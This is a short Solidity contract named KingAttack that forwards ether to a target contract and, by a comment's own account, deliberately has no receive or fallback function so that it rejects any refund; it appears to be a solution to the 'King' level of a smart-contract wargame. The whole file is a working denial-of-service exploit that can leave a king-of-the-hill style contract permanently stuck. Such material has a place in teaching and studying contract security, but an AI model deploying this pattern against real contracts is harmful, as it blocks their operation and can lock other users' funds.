// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttack {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function attack() public payable {
        address payable addr = payable(address(target));
        (bool success, ) = addr.call{value: msg.value}("");
        require(success, "call failed");
    }

    // just reject to receive funds. (no fallback or receive function)
}
